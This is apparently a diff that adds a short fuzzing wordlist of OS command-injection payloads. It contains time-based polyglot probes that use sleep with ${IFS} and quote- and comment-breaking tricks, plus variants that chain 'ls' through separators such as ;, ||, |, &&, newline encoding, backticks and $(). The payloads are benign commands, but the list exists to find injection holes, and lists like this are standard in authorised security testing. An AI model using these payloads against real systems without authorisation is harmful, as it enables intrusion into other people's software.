@@ -1,0 +1,10 @@
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+;ls
+||ls;
+|ls;
+&&ls;
+&ls;
+%0Als
+`ls`
+$(ls)
